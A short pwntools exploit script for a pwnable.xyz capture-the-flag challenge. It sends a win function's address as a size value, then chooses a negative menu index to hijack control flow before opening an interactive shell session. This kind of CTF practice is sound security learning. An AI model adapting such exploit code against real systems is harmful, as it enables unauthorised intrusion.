from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
p = process(e.path)
p = remote('svc.pwnable.xyz',30007)

win = str(e.symbols['_'])
print(win)


p.recvuntil(b'> ')
p.sendline(b'1')
p.sendlineafter(b'Size: ',win)
p.recvuntil(b'> ')
p.sendline(b'-2')

p.interactive()